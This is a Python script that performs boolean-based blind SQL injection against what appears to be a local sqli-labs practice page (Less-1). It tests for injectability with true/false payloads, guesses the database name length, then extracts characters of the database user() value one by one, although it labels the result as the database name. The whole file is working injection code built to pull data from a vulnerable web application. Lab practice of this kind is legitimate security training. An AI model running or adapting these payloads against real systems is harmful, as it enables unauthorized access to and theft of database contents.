
#coding=utf-8

import requests


different_Str = "Your"

def CheckVUL(URL):    
    p1 = URL + "\' aND 1=1--+"
    p2 = URL + "\' And 2=3--+"

    print(p1)
    r1 = requests.get(p1).text
    print(p2)
    r2 = requests.get(p2).text

    if different_Str in r1 and different_Str not in r2:
        print("It is vulnerable.\n")
        return True
    else:
        print("It' s not vulnerable......")
        return False
        



def database_len(URL):
    print("Checking database length...\n")
    for i in range(1,15):
        payload_len = URL + "\' And length(database())=%s-- " % i
        print(payload_len)
        response_len_text = requests.get(payload_len).text
        if different_Str in response_len_text:
            print("database_len is: %s " % i)
            return i


def database_Name(URL,DBLen):
    database_Name = ""
    paylaodStr = '!@$%^&*()_+=-|}{POIU YTREWQASDFGHJKL:?><MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'

    for i in range(DBLen):
        for p in paylaodStr:
            
            # 从左往右枚举
            payload_dbName_left = URL + "\' and locate(BINARY \'" + database_Name + p + "\', user())>0--+"
            print (payload_dbName_left)
            response_dbName_left_text = requests.get(payload_dbName_left).text
            
            if different_Str in response_dbName_left_text:
                database_Name += p
                print("No.%s is: %s"%(i,database_Name))
            else:
                # 从右往左枚举
                payload_dbName_right = URL + "\' and locate(BINARY \'" + p + database_Name + "\', user())>0 --+"
                print (payload_dbName_right)
                response_dbName_right_text = requests.get(payload_dbName_right).text
                if different_Str in response_dbName_right_text:
                    database_Name = p + database_Name
                    print("No.%s is: %s"%(i,database_Name))
    
    return database_Name







if __name__ == "__main__":
    Target_URL = "http://localhost/sqlilabs/Less-1/?id=2"
    if not CheckVUL(Target_URL):
        exit(1)

    db_len = database_len(Target_URL)
    dbName_str = database_Name(Target_URL,db_len)
    print (dbName_str)


